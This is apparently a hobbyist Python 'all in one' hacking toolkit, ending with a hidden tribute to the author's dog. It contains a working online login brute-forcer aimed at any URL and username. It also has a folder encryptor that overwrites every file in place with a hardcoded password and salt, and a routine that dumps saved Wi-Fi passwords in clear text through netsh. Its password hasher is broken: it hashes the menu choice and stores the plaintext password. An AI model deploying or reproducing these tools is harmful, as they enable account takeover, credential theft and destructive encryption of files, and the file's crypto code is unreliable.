# ----------Banner--------
from pyfiglet import Figlet
from termcolor import colored, cprint

# http://www.figlet.org/examples.html - fonts
# Text colors:
#
# grey
# red
# green
# yellow
# blue
# magenta
# cyan
# white

# Text highlights:
#
# on_grey
# on_red
# on_green
# on_yellow

# Attributes:
#
# bold
# dark
# underline
# blink
# reverse
# concealed


# ----------Fernet imports----------
import base64
import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet, InvalidToken
import hashlib
# -----------Brute Force imports-------
import requests
import random
# -----------Check+Hasher imports-------
import re
import bcrypt
# -----------Wifi SSIDs imports-------
import subprocess

# -----------IMPORTS-------


# TODO: -----------TODO-------
'''
- Add English only to the Password Checker Hasher
- Add File with Passwords to hash
-Error Check
- Add colors to each menu
- clear the terminal each time you choose something


'''


# TODO: -----------TODO-------

class Wipe(object):
    def __repr__(self):
        return '\n' * 10000


wipe = Wipe()

custom_fig = Figlet(font='block')
print(colored(custom_fig.renderText("Welcome To Kika All In One"), 'cyan'))


class AllinOne:
    def HackTools(Elvo):
        # custom_menu = Figlet(font='digital')
        print(colored('Welcome to the Main Menu!', 'blue', attrs=['bold']))
        print(('''
 | For | Brute-Force >             [1]
 | For | Kika Encryption >         [2]
 | For | Password Checker+Hasher > [3]
 | For | Wifi Intelligence >       [4]

 '''))
        User_Choice = input("And your choice would be?\n...: ")
        print(wipe)
        print("You chose...: ", User_Choice)

        # -----------------------Brute Force-----------------------
        if User_Choice == '1':
            print(wipe)

            def QUESTIONBRUTEFORCE():
                custombruteforce = Figlet(font='bubble')
                print(custombruteforce.renderText('''"Welcome To Elvo
Brute-Forcer'''))

                BruteIntro = print('''How would you like to Brute Force?

With a Worldlist >         [1]
With Random Numbers >      [2]
With Your Own Characters > [3]
To Main Menu >             [4]
...:''')

                BruteChoice = input(str("And your choice would be?\n...: "))
                print(wipe)
                print("You chose...: ", BruteChoice)

                if BruteChoice == "1":
                    print(wipe)
                    url = input('Place the URL: ')
                    username = input('Place the username: ')

                    # chars =  "123"

                    def send_request(username, passwd):
                        data = {
                            "username": username,
                            "password": passwd
                        }

                        r = requests.get(url, data=data)
                        return r

                    def implist():
                        print('ADD .txt TO THE FILE!')
                        worldlist = input('Wordlist Path...: ')
                        try:
                            file = open(worldlist, 'r')
                            tries = file.read().split('\n')
                            file.close()
                            return tries
                        except FileNotFoundError:
                            print(wipe)
                            return print(colored('\nWOOF WOOF WOOF! , Try Again.\n', 'red')), QUESTIONBRUTEFORCE()

                    def BRUTEWOOF(tries):
                        for passwd in tries:
                            r = send_request(username, passwd)

                            if 'failed to login' in r.text.lower():
                                print(f"Incorrect {passwd}\n")
                            else:
                                print(f"Correct Password | {passwd} | !\n")
                                break

                    tries = implist()
                    BRUTEWOOF(tries)

                elif BruteChoice == "2":
                    print(wipe)

                    url = input('Place the URL: ')
                    username = input('Place the username: ')
                    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
                    try:

                        def send_request(username, passwd):
                            data = {
                                "username": username,
                                "password": passwd
                            }

                            r = requests.get(url, data=data)
                            return r

                        def BRUTEWOOF():
                            while True:
                                rndpasswd = random.choices(chars, k=2)
                                # k= is the password length.
                                passwd = "".join(rndpasswd)
                                # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
                                r = send_request(username, passwd)

                                if 'failed to login' in r.text.lower():
                                    print(f"Incorrect {passwd}\n")
                                else:
                                    print(f"Correct Password | {passwd} | !\n")
                                    break

                        BRUTEWOOF()
                    except requests.exceptions.MissingSchema:
                        print(wipe)
                        return cprint(
                            colored('\nWOOF WOOF WOOF! , Try Again.\n', 'red', attrs=['bold'])), QUESTIONBRUTEFORCE()

                elif BruteChoice == "3":
                    print(wipe)
                    url = input('Place the URL: ')
                    username = input('Place the username: ')
                    chars = input('Write the characters to use')
                    try:

                        def send_request(username, passwd):
                            data = {
                                "username": username,
                                "password": passwd
                            }

                            r = requests.get(url, data=data)
                            return r

                        def BRUTEWOOF():
                            while True:
                                rndpasswd = random.choices(chars, k=2)
                                # k= is the password length.
                                passwd = "".join(rndpasswd)
                                # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
                                r = send_request(username, passwd)

                                if 'failed to login' in r.text.lower():
                                    print(f"Incorrect {passwd}\n")
                                else:
                                    print(f"Correct Password | {passwd} | !\n")
                                    break

                        BRUTEWOOF()
                    except requests.exceptions.MissingSchema:
                        print(wipe)
                        return cprint(
                            colored('\nWOOF WOOF WOOF! , Try Again.\n', 'red', attrs=['bold'])), QUESTIONBRUTEFORCE()

                elif BruteChoice == '4':
                    print(wipe)
                    print(colored('\n>>>Back To the Main Menu>>>', 'blue'))
                    return object.HackTools('Elvo.a')

                else:
                    print(wipe)
                    cprint(colored('\nWOOF WOOF WOOF! , Try Again.\n', 'red', attrs=['bold']))
                    return QUESTIONBRUTEFORCE()

            QUESTIONBRUTEFORCE()
        # -----------------------Brute Force-----------------------

        # -----------------------Fernet-----------------------
        elif User_Choice == '2':
            custombruteforce = Figlet(font='bubble')
            print(custombruteforce.renderText("Welcome To Elvo\n "
                                              "Encryptor"))

            # ---------Generate Key-------------

            try:
                file = open('fernetkey.key', 'rb')
                key = file.read()
                file.close()
            except FileNotFoundError:
                key = Fernet.generate_key()
                file = open('fernetkey.key', 'wb')
                file.write(key)
                file.close()

            password_provided = "password"  # This is input in the form of a string
            password = password_provided.encode()  # Convert to type bytes
            salt = b'\n\x8dl\xfb&\x92\x86\xa6\x9e\xfb!\xec\xeb\x02\xcc\xee'
            # CHANGE THIS - recommend using a key from os.urandom(16), must be of type bytes
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=300000,
                backend=default_backend()
            )
            key = base64.urlsafe_b64encode(kdf.derive(password))  # Can only use kdf once

            def QUESTIONFERNET():

                FERNETQUESTION = input('''What would you like to do?

To Encrypt >   [1]
To Decrypt >   [2]
To Main Menu > [3]
...:''')

                if FERNETQUESTION == '1':
                    print(wipe)
                    # --------------Encryption--------------
                    folderpath = input('Place the Folder Path...: ')
                    looptimes = input('How many times to run...: ')
                    try:
                        number = int(looptimes)
                        pass
                    except ValueError:
                        cprint(colored('\nWOOF WOOF WOOF! , Try Again.\n', 'red', attrs=['bold']))
                        return QUESTIONFERNET()
                    if number <= 0:
                        number = 1

                    counter = 1
                    complete_files = []
                    for root, dir_names, file_names in os.walk(folderpath):
                        for f in file_names:
                            complete_files.append(os.path.join(root, f))

                        for times in range(number):
                            for file in complete_files:
                                fullpath = f'{file}'

                            input_file = fullpath
                            with open(input_file, 'rb') as f:
                                data = f.read()  # Read the bytes of the input file
                                base64encoding = base64.b64encode(str(input_file).encode('ascii'))
                                SHA256encoding = hashlib.sha256(str(input_file).encode('UTF-8')).hexdigest()
                                counter += 1

                            fernet = Fernet(key)
                            encrypted = fernet.encrypt(data)

                            with open(input_file, 'wb') as f:
                                f.write(encrypted)  # Write the encrypted bytes to the output file
                            print(wipe)
                            print(
                                f'File Name...:{file}\nFile Number...:{counter}Looptime...:{times}\nBase64...:{base64encoding}\nSHA256...: {SHA256encoding}\n\n --------next file--------\n')

                elif FERNETQUESTION == '2':
                    print(wipe)
                    #  ------------------DECRYPTION--------------------

                    Question = input("Are you sure? Yes/No...: ").capitalize()
                    if Question == 'Yes':
                        folderpath = input('Place the Folder Path...: ')
                        looptimes = input('How many times to run...: ')
                        try:
                            number = int(looptimes)
                            pass
                        except ValueError:
                            cprint(colored('\nWOOF WOOF WOOF! , Try Again.\n', 'red', attrs=['bold']))
                            return QUESTIONFERNET()
                        if number <= 0:
                            number = 1

                        counter = 1
                        complete_files = []
                        for root, dir_names, file_names in os.walk(folderpath):
                            for f in file_names:
                                complete_files.append(os.path.join(root, f))

                            for times in range(number):
                                for file in complete_files:
                                    fullpath = f'{file}'

                                input_file = fullpath

                                with open(input_file, 'rb') as f:
                                    data = f.read()
                                    counter += 1

                                fernet = Fernet(key)
                                try:
                                    decrypted = fernet.decrypt(data)

                                    with open(input_file, 'wb') as f:
                                        f.write(decrypted)
                                        print(
                                            f'File Name...:{file}\nFile Number...:{counter}\nLooptimes...:{times}\n --------next file--------\n')


                                except InvalidToken as e:
                                    print(wipe)
                                    print(colored("WOOF:No more files to decrypt", 'green'))


                    else:
                        print(wipe)
                        print(colored("WOOF WOOF...\n", 'yellow'))
                        return QUESTIONFERNET()

                elif FERNETQUESTION == '3':
                    print(wipe)
                    print(colored('\n>>>Back To the Main Menu>>>', 'blue'))
                    return object.HackTools('Elvo.a')


                else:
                    print(wipe)
                    cprint(colored('\nWOOF WOOF WOOF! , Try Again.\n', 'red', attrs=['bold']))
                    return QUESTIONFERNET()

            QUESTIONFERNET()
            # -----------------------Fernet-----------------------

            # -----------------------Password Checker+Hasher-----------------------
        elif User_Choice == '3':
            print(wipe)
            customcheckerhasher = Figlet(font='bubble')

            print(customcheckerhasher.renderText('''Welcome To Elvo\nPassword Checker \nand Hasher'''))

            def PASSCHECKER():
                print(''' 
Welcome!
Here you can check if your password is strong enough.
Password MUST have:
    1. Cant have spaces!.
    2. Has to be in ENGLISH!.
    3. Minimum 6 characters long.
    4. Has to have at least one number.
    5. Has to have at least lower case letter.
    6. Has to have at least one special character.
    7. Has to have at least one upper case character.
                ''')
                PASSWORDQ = input('''Test and Hash OR Main Menu? 
Test and Hash > [1]
Main Menu >     [2]
...:''')
                if PASSWORDQ == '1':
                    print(wipe)
                    PASSWORD = input('Check Your Password...:')
                    x = True
                    while x:
                        if (len(PASSWORD) < 6 or len(PASSWORD) > 100):
                            print("\nPassword length between 6 and 12 please")
                            break
                        elif not re.search("[abcdefghijklmnopqrstuvwx]", PASSWORD):
                            print("\nYou need at least one lower case letter")
                            break
                        elif not re.search("[0123456789]", PASSWORD):
                            print("\nYou need at least one number")
                            break
                        elif not re.search("[ABCDEFGHIJKLMNOPQRSTUVWX]", PASSWORD):
                            print("\nYou need at least one upper case character")
                            break
                        elif not re.search("[!@#$%]", PASSWORD):
                            print("\nYou need at least one special character please")
                            break
                        elif re.search("\s", PASSWORD):
                            print("\nYou cannot have blank spaces in your password...")
                            break

                        else:
                            print(colored("Your Password is strong enough", 'red'))
                            x = False

                            # -------------Password Hasher-------------
                            def PASSHASHER():
                                print('Hash your Password OR Main Menu')
                                PASSHASH = input('''
Hash My Password >    [1]
Main Menu  >          [2]

...: ''')
                                y = True
                                while y:
                                    if PASSHASH == '1':
                                        print(wipe)
                                        y = False
                                        PWDHASH = PASSHASH
                                        bytePWDHASH = PWDHASH.encode('utf-8')

                                        SALT = bcrypt.gensalt()
                                        hash = bcrypt.hashpw(bytePWDHASH, SALT).decode('utf-8')

                                        with open('Passwordhash.txt', 'w') as f:
                                            f.write('The Password you hashed: ')
                                            f.write(PASSWORD)
                                            f.write('\nYour Password Hash: ')
                                            f.write(hash)

                                        print(wipe)
                                        print('Password Info - ')
                                        print('Your Password: ', PASSWORD)
                                        print('Your Hashed Password:', hash)
                                        print('Your Passwords are save in:', os.getcwd() + '\Passwordhash.txt')

                                        print('>>>Back To the Main Menu>>>')
                                        return object.HackTools('Elvo.a')
                                    elif PASSHASH == '2':
                                        break
                                    else:
                                        print(wipe)
                                        cprint(colored('\nWOOF WOOF WOOF! , Try Again.\n', 'red', attrs=['bold']))
                                    return PASSHASHER()

                                if y:
                                    print(wipe)
                                    print(colored('\n>>>Back To the Main Menu>>>', 'blue'))
                                    return object.HackTools('Elvo.a')

                            # -------------Password Hasher-------------
                            PASSHASHER()
                            break

                    if x:
                        print(wipe)
                        cprint(colored('''\n
-----ERROR-----
Check the Error above!
Try a different password
-----ERROR-----
\n''', 'red', attrs=['bold']))

                        PASSCHECKER()
                elif PASSWORDQ == '2':
                    print(wipe)
                    print(colored('\n>>>Back To the Main Menu>>>', 'blue'))
                    object.HackTools('Elvo.a')
                else:
                    print(wipe)
                    cprint(colored('\nWOOF WOOF WOOF! , Try Again.\n', 'red', attrs=['bold']))
                    PASSCHECKER()

            PASSCHECKER()

            # -----------------------Password Checker+Hasher-----------------------

            # -----------------------Wifi SSIDs-----------------------
        elif User_Choice == '4':
            print(wipe)

            customwifissid = Figlet(font='bubble')
            print(customwifissid.renderText("Welcome To Elvo\n "
                                            "Wifi Intelligence"))

            def WIFISSID():
                print('Known Networks OR Available Networks?')
                WIFINETAVA = input('''
Known Networks >     [1]
Available Networks > [2]
Main Menu >          [3]                
...:''')
                if WIFINETAVA == '1':
                    print(wipe)

                    print('All Known Networks OR Connect OR Main Menu')
                    WIFIQU = input('''
All Known Networks >         [1]
Connect To A Known network > [2]
Main Menu >                  [3] 
...:''')
                    if WIFIQU == '1':
                        print(wipe)

                        CMD = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
                        # .stdout.decode - shows all the wifi names in a table

                        WIFINAMES = (re.findall("All User Profile     : (.*)\r", CMD))
                        # finds all the "All user Profile" text in the CMD

                        WIFILISTNAMES = []
                        # creating an empty list for all the wifi usernames and password to be saved in

                        if len(WIFINAMES) != 0:
                            for name in WIFINAMES:
                                WIFIPROFILE = {}
                                # dictionary for each wifi profile

                                PROFILEINFO = subprocess.run(["netsh", "wlan", "show", "profile", name],
                                                             capture_output=True).stdout.decode()

                                if re.search("Security key           : Absent", PROFILEINFO):
                                    continue
                                else:
                                    WIFIPROFILE["ssid"] = name
                                    PROFILEINFOPASS = subprocess.run(
                                        ["netsh", "wlan", "show", "profile", name, "key=clear"],
                                        capture_output=True).stdout.decode()
                                    PASSWORD = re.search("Key Content            : (.*)\r", PROFILEINFOPASS)
                                    if PASSWORD == None:
                                        WIFIPROFILE["password"] = None

                                    else:
                                        WIFIPROFILE["password"] = PASSWORD[1]

                                    WIFILISTNAMES.append(WIFIPROFILE)

                                    def WIFICONNECTION():
                                        print('\nConnect to WiFi OR Main Menu')
                                        WIFICON = input('''
Connect To The WiFi >    [1]
Main Menu >              [2]

...:''')
                                        if WIFICON == '1':
                                            print(wipe)
                                            print('\n-----KNOWN NETWORKS-----')
                                            for i in enumerate(WIFINAMES[:]):
                                                print(*i)
                                                for n in range(0):
                                                    print(n)
                                            print('\n-----KNOWN NETWORKS-----')
                                            # -----------------------Wifi Known Network connector-----------------------
                                            print('Choose your Network.')

                                            def WIFINET():
                                                valid = False
                                                while not valid:  # loop until the user enters a valid int
                                                    try:
                                                        WIFINETWORK = int(input('...: '))
                                                        valid = True  # if this point is reached, x is a valid int
                                                        WIFINETCON = subprocess.run(["netsh", "wlan", "connect",
                                                                                     f"ssid={WIFINAMES[WIFINETWORK]}",
                                                                                     f"name={WIFINAMES[WIFINETWORK]}"])
                                                        WIFINETCON
                                                        object.HackTools('Elvo.a')
                                                    except ValueError:
                                                        print('That\'s not one of the Networks... try again..')
                                                        cprint(
                                                            colored('Choose one of the Networks above. NUMBERS ONLY!',
                                                                    'red', attrs=['bold']))
                                                        WIFINET()

                                            WIFINET()


                                        elif WIFICON == '2':
                                            print(wipe)
                                            print('\nAs you wish')
                                            object.HackTools('Elvo.a')
                                        else:
                                            cprint(colored('\nWOOF WOOF WOOF! , Try Again.\n', 'red', attrs=['bold']))
                                            WIFICONNECTION()
                                        # -----------------------Wifi Known Network connector-----------------------

                        for x in range(len(WIFILISTNAMES)):
                            print('\n--------------------Wifi Network-----------------------')
                            print(WIFILISTNAMES[x])
                            print(f'---------------------------------------------------------')
                        WIFICONNECTION()

                    # -----------------------Wifi Available Network-----------------------
                    elif WIFIQU == '2':
                        print(wipe)
                        CMD = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
                        # .stdout.decode - shows all the wifi names in a table

                        WIFINAMES = (re.findall("All User Profile     : (.*)\r", CMD))
                        # finds all the "All user Profile" text in the CMD
                        print('\n-----KNOWN NETWORKS-----')
                        for i in enumerate(WIFINAMES[:]):
                            print(*i)
                            for n in range(0):
                                print(n)
                        print('\n-----KNOWN NETWORKS-----')
                        # -----------------------Wifi Known Network connector-----------------------
                        print('Choose your Network.')

                        def WIFINET():
                            valid = False
                            while not valid:  # loop until the user enters a valid int
                                try:
                                    WIFINETWORK = int(input('...: '))
                                    print('\n')
                                    valid = True  # if this point is reached, x is a valid int
                                    WIFINETCON = subprocess.run(
                                        ["netsh", "wlan", "connect", f"ssid={WIFINAMES[WIFINETWORK]}",
                                         f"name={WIFINAMES[WIFINETWORK]}"])
                                    print('\n\n')
                                    WIFINETCON
                                    object.HackTools('Elvo.a')
                                except ValueError:
                                    print(wipe)
                                    cprint(colored('\nWOOF WOOF WOOF! , Try Again.\n', 'red', attrs=['bold']))
                                    cprint(colored('Choose one of the Networks above. NUMBERS ONLY!', 'red',
                                                   attrs=['bold']))
                                    WIFINET()

                        WIFINET()

                    elif WIFIQU == '3':
                        print(wipe)
                        print(colored('\n>>>Back To the Main Menu>>>', 'blue'))
                        return object.HackTools('Elvo.a')
                    else:
                        print(wipe)
                        cprint(colored('\nWOOF WOOF WOOF! , Try Again.\n', 'red', attrs=['bold']))
                        return WIFISSID()

                elif WIFINETAVA == '2':
                    print(wipe)
                    AVACMD = subprocess.run(["netsh", "wlan", "show", "networks"], capture_output=True).stdout.decode()
                    print(AVACMD)
                    print(colored('\n>>>Back To the Main Menu>>>', 'blue'))
                    object.HackTools('Elvo.a')
                elif WIFINETAVA == '3':
                    print(wipe)
                    print(colored('\n>>>Back To the Main Menu>>>', 'blue'))
                    object.HackTools('Elvo.a')

                else:
                    print(wipe)
                    cprint(colored('\nWOOF WOOF WOOF! , Try Again.\n', 'red', attrs=['bold']))
                    WIFISSID()

                    # -----------------------Wifi Available Network-----------------------

            WIFISSID()
            # -----------------------Wifi SSIDs-----------------------

        # -----------------------About Kika----------------------
        if User_Choice == '0':
            print(wipe)
            print('''
            Welcome to the hidden part of my code.
            If you made it here it means that you may have done something right :).
            About Kika:
            Kika was adopted on 27.1.2012 from a dog shelter.
            She is:
            ⅓ - Pinscher
            ⅓ - Chihuahua 
            ⅓ - Pekingese
            She has beautiful life, she like to run, jump, play and eat your food.
            She also likes to sit on high places(just like cat) and go for walks.
            She is a beautiful and funny dog that you can always play with.
            And also she was very nice to people and a bit jealous too 
            But at the age of 11 she was diagnosed with cognitive syndrome.
            Which makes her forget things.
            So far the doctor is giving her pills that would hopefully help her.
            But if that would not help her with might have to put her down :'( :'( :'(
            Because we don't want her to suffer or be in pain.
            So? how is it related to this All-In-One tool?
            The answer is quite simple.
            Kika is my dog, which means that her memory is being lost slowly (because of the cognitive syndrome)
            so for here honor, maybe she is forgetting but this tool is for HER! this tool would not be forgotten!
            I'll keep adding notes here. 


            Kika:
                           .^^:::.                                                                             
                          :P#&&&&##G?!.                                                               .         
                          G&&&&&&&&&&##BP!::                                                ..^7?5PPGB#B#BB5?.  
                          G&&&&&&&&&&#B#&&##GP~                                     .: .~YYGB#&&&&&&&&&&&&&&&#~ 
                          ?@&&&&&&&&&&#GPB###&&G?.                                 7BBB###BB#&&&&&###&&&&&&&&5  
                          ^&@&&&##BBB##&#GGB###&#G7:                    :....:.  ~B&####BB#&###&##BBB#&&&&&&G   
                          5@@@&##B5YYYJ55555G##&#BBPGJ:           :?JJJY5555PGPJ5&&&&&&##BBBPP55Y55PGB&&&&&P.   
                        :5&&&&#G5JJJ?7??7?YY5G#&&##BBBBGGPP5Y?J?7YPPPGGGGGBGBBBB##&&&&&&&#G5J??77?JYPGB&@@&5    
                      .JYGBGGP5YJJYJ??JY5PGGBB##&&###BBB#BBBGGGBBBBBGGGGGBGGGGGBBBB##&&&&BPPPPGPP5??Y5P#&&G.    
                     :^JG&#BGP5YY555PGBBB####&########BBBBBBBGGGGGB#BBBGGGGGGGGGGBB##&&&&&&&###B##P?J7J5PG!     
                         ^P&&#GGGBB###&&&&&&&&&#######BBBBBGBBBGGGBB#BBGGGGGGGGGGGBB##&&&&&&&#GPPPGYPG5Y!.      
                        :~5#&&#B#######&&&&&&&&&&&&###BBBBBBBBBBBGBBBBBBBGGBGGGGGGGB##&&&&&&&&###BBBBP!.        
                        .JYYB&#####&&&&&&&&&&&&&&&&#####B###BBBBBBBBBBBBBBBBBBBBGGGG##&&&&&&&&&&&#BBB?          
                         !B###&&&##&&&&&&&&&&&&&&&&&&#############BB##########BBBBBGB###&&&&&&&&#BBBBY.         
                         .5BB#####&&&&&&&&&&&&&&&&&&&######&&&&&#######&#########BBBBB##&&&&&&&&&#BBBG?         
                          ?BB#&&&&&&&&&&&&&&&&&&&&&&&##B##GGB#&&&&&&&&&&&&&&&&#G55PGGBB##&&####&&&#BP^          
                          :#&&&&&&&&&&&&&&&&&&&&&&&#BGPP5?777?Y#@&&&&&&&@&&&&G?!!!7?5PGB#&&&###&&&&#B^          
                         J#&&@&&&&&&&&&&&&&&&&&&&#BP5YYY?~^~!7!7#@@@@@@@@@@&P7!!~~?PBBBBB&&&##&&&&&&B           
                         :J5&@@@@@@@@@@@&@&&&&&&####&&&##GJ7?7!!5@@@@@@@@@@&5!!!~JPB#####&&&&&@@&&&&?           
                            ~#@@@@@@@@@@@@@&&&&&&&&&##G5G&#5YJ7?B@@@@@@@@@@&P!!?G#P5JG&#&&&##&&@&&&&#J          
                              J&@@@@@@@@@@&&&&&&G#G####&##&#G5YP&@@@@&@&&&@&#G5G##&B##5J##&###&&&&&&@&5~        
                              :@@@@@@@@@@@@&&&&#GYGB&#&&&&###B#&@@@&&&&&&&&&&&BGPBGB#PJP##&##&&&&&&&&&&#~       
                            7G#@@@@@@@@@&&##&&&&&G5PB#########&@&&&&&&&&&&&&&##BBBBPYYG######&@&&&&&&&&&!       
                            .#&&@@@@@@@BYJ?B&&&&&&#BGPGBBBB#&&&&&&##&#####&&#BB#BBG5GB#&#YJ5G@@&&&&&&&#:        
                             ~##&&@@@@@#?!?#&&&&&&@@&&#B5G#&&#BGGPGB######BBPYY5GP5GB#&&5~!Y&@&&&&&&#B#7        
                              .P@@@@@@@@BYG&&&&@@&##BBG55B#BP5YJYYPBBB#&&BBGY?777J!??B&G!~P@@@@@@&&&&&#B5?77.   
                               .&@@@@&@@@&&&&&&&&BJ?7!!!7PPYJ?J??J55PGG#&#G5J7!!!!~:^5GYP&@@@@@@@&#####7        
                                 P@@&&&@@@@&&&BGPY7!~^^~!?JJ?7??7JPB#BGP55555Y7~~~~^^5#&@@&@@@@@@&#BP7~         
                               .7Y#@&&@@&&#BBG5YJ777!~~~!J?!!~^~!P&&&&&#55B&#B5^^^^~JGP5PGB&&&@@@@&B.           
                                5@@@@@@@&BGPP5J?77!777!!?J~^^^^^~Y#&&@@&BB&@&&P^:..:J5555B##&@@@@@&B            
                              .P@@@@@&&&&#BB55Y?7777?7!?J?!^::^~7J5B#BBB##GGB5?~:..:5BBG#&@@&@@@@&&#.           
                              ~B&@@@@@@@@@&#BGBPYJ??J?77?J?!~^^^!JYPB&&&&&&#5?7~:.:7GPG&@@@@@@@@@@&P            
                               !&&@@@@@@@@@&BGGBG555YJ?7J5YJY5PG5YY555PPPPJJ7!7!!?YBB#B&@@@@@@@@#5J:            
                                J@@@@@&@@@@@&BBBP5555YYJYJ?J5P#&&#####BBGG5J5G?7P###&@#@@@@@@B~:                
                                ^5@@@@@@@@@@@&GGPP555555YJJJ?!75PPPPB#&#&&BP5J^G&&&&@@@@@@@@J                   
                                .#@@@@@@@@@@@@#GP55555PP55555Y777!~!7?Y7JJ!~!75&&&&@@@@@@@G.                    
                                :&@@@@@@@@@@&#BGPPPPP5PPGGGGP55YJ??77?JJ?7?5G&&##&@@@@@@@&.                     
                                #@@@@@@@@@@&&GPGGP5Y5PP5555555YYY55P55PPPPGGG&&&&@@@@@@@&?                      
                                #@@@@@@@@@@&&##&@@&BYJYYYYYYYYY???J?JJYYY5GBBB##@@@@@@@@@^                      
                               7@@@@&&@@@@@@@@&@@@@@#BP5PYJY555YJJ??JJJY5PB###&@@@@@@@@&J                       
                               ~@@@@@@@@@@@@@@&&@@@&#GB##J?P#GPP5YYYY5Y5PG&@&@@@@@@@@@@@:                       
                                5@@@@@@@@@@@@@@@@@@@#BPBB575&#GBB5555PPB&@@@@@@@@@@@@@@&.                       
                               .5@@@@@@@@@@@@@@@@@@@&#GPGBG5P#&&&#BB#&&@@@@@@@@@@@@@@@@~                        
                              .?@@@@@@@@@@@@@@@@@@&@@&#BGGB&&#G#@&##&@@@@@@@@@@@@@@@@@&^                        
                             7@&@@@@@@@@@@@@@@@@@@@@@@&&###&&&&@@@@@@@@@@@@@@@@@@@@@&&7                         
                             J@@@@@@@@@@@@@@@@@@@@@&@@@&&&&&&@@@@@@@@@@@@@@@@@@@@@@@&J
                             Woof                                                wooF
                                Woof                                          wooF
                                    WOOF                                  WOOF






            ''')
            print(wipe)
            print('''
                                          :!!!!77!~~~^^~!~^......:::...                              
                                        .J55PPPPPPP55PGGGGGPPPPPP55555YJ!^                          
                                     .~JGBGGGGPPPGPPGGGGGBBBBGGGGGPPPPPPP5Y~                        
                                 .~?PB##BBGGGPPGGPPGGGGGGBBGGBBGGGGGGGGPP555Y!.   .:.^?7?Y5PYYJ5?!~.
 .~?5#BBBGBGP5Y?!^!PJ:         :YB####BBBBBBGGBGBBBB####BBGBGGGGGGGGGGGGPPGGGBGPG#&&&&&&@@@@@@@@@@@&
5&@@@&@@@@@@@@&&&&&&&#Y.^:   :YB#####BBBBBBBBB##B######BBGGBGGPPPPPPPGGGG#&&&##&&&&&&&&@@@@@@@@@@&&&
@@&&&&&&@@@@@@@@@&&&&#&&GB5!?BB####BBBBGGGGBBBBGGGGBGPPPPPPPPPPPPPPPPGBB#&&&&&###BB#&&&&##&&&&&@@@@&
5@@&&&&@@&&&&&&&###&&&##&&&&#B##&&&#GGGGGBGBBGPPGGGGGGGGBBBBBBBB##BGGGB&&&@&&&&&#BBBB######B&&&&&@@@
 Y@@@@@@&#B####BB########&@@&&@@&#BBB#########BBBBB##BBGBBBBBBBBB#BBBB#&&&@&&@&&&#G5YY5PPGGGB&@@@@B~
  ^#@@@&&#GGGPPPPPPPGB##&&@@@&&&#####################&&###BBB##BBBBBBB#&&&&@@@&&#GP55PGGGPY55#&@@7  
    .7##BBGGP5555Y5PPGGB##&&@&&&&&&&####&###B#######&&&&##BB#BBBBBBB##B###&&@@@&#####&&&&#P?7YP5:   
      .7YB#BP55PGB##&&&&&&&@@&&&&&&&##&#############&&######BBBBGBBGBBB#B##&&@@@&&########B577^     
       ^JYG###&&&&&&&&&@&&@@&&&&&&&&&&&&######&######&######B##BBGBGGBBBB##&&&&@&&&##&&&#BP.        
           7#&&&&&&&&@&&@@@@&&&&&#&&####&&##&#&##BB###&&&#&&&####BGBGGB####&&&&&&&##&&#BG7.         
            YBB###&&@&&@@@@&&&&&&##&&###&&&&&&&&####&&&&&&&&&&&&&#GGGB###&&#&&&&&&&&&#BBG.          
           !5B##&&&@@&@@@@&&&&&&&&&&###&@@@@&&&&&&#&&&&&&&&&&&&@@&&BGGB#&&&&&&&&&&&&&@@@Y           
           ~5G##&@@@@@@@@@@@@@@&&&&##&&&#&&@@@&&@@&&@@@@@&&&@@@&#BB##GGGB#&&&&&&&&&&&@&J.           
            B&&@@@@@@@@@@@@&&&&&&#####GYJ?JYG&@@@@@@@@@@@@@@&#PJ???5PPPPPB&&&&&@@@@&@J.             
           .7~JG&@@@@@@@@@@@&&&#BPP55YJ7!!7775&@@@@@@@@@@@@@BY77!!7J5PGGPG&&&&&&@&&#7               
                 .~P@@@@@@@@@@#BBGGGGGG5J?????G@@@@@@@@@@@@&PJ??7!JBBGGPGB&&&##B&&&#.               
                    Y@&@@&&&@@&&&#&&B&&@&5JJJ?P&@@@@@@@@@@@&P????P&&&GG&#B&###G?GB#&!               
                     G&@@&&@&&&##B#&#&&&@&P5YPB&@@@@@@@@@@@@#P5GB#&#&&##PJGBBG?G&#B#P               
                    YBBB#&&&&&&P5GB#&&&&&#&###&@@@&@@@&@@&@@@&###B&#BG5YJPBBBBPPG#&#B7              
                   JG5PGB55&&&&&G5PGB###&&&&&&@@&&&&&&&&&&&&&&&&##BG55YJP#&&#GP5YYPB##5             
                   ?J5GGBBG&&&&&&#GPGBB####&@@@&&&&&&#&&&@&&&&@&#B##BBB#@@&#GGPYYJYJ5B:             
                  !Y55PGBB#&@@&&&&&&&###B#&@&&#########&&&##B##&&##GGP#@&GPP555555JJJY~             
                 7JJYY5GBBB#&@@@@&##B###&&&#BGGGBB##&&#&&##BGPPPG#PJ?Y#&5YYYY555YJ?JYJJ7^           
                .YJJY5PGGGGG#&@@&5777JYP#BPP555PB###&&&&##BG5YYYYYP5YPB5YYYJJJYYJYJYPP?7?7~         
                 ?JJY5PP555PG#&@@G!^~!!J5YYYYY5PGB#B#&@#BBGPYJJJJJ5GB#P???J????JYJJJ55J?5P5.        
                 ~JYYP5P55555BBG#@G!!!!?YJJJJYYPBB#BBGBBBBGP5JJJ?J5G#&P77?J??JYJP5YYJ5PPJYY         
                 7YY55YYYYY55PG#&@@G?7??77!!7?P#####BPPB##BBBY777?J5&@B7!~?Y5PPPPYJ!7?P#BG5.        
                .JY55YYYJJY55Y5G&@@@57?!~^~~7?P#&@@@&##@@@@@&57!!!?B@@B!!PGGPPGG!~!77?YBBPJ:        
                !JJJY55YYYPP5JJ5B@@@&G57.     ~P#&&GBGYB&##PYPJ?7JG&@@B55&&BYG#57YG??JJJG^          
               .JY5YJJYJJJY5YJ?J5&@@&&&?         ^!  . .^    ^~^!?7^::^..7B5PBB#BB&GBBGJ^           
               ^7^:Y557?!5?~??75YB&@YJY^                                  ^J5PB&&&@&&B~             
                   ~J: .:^.?YJYGPGB#7                                         .^^#&!.  

            ''')
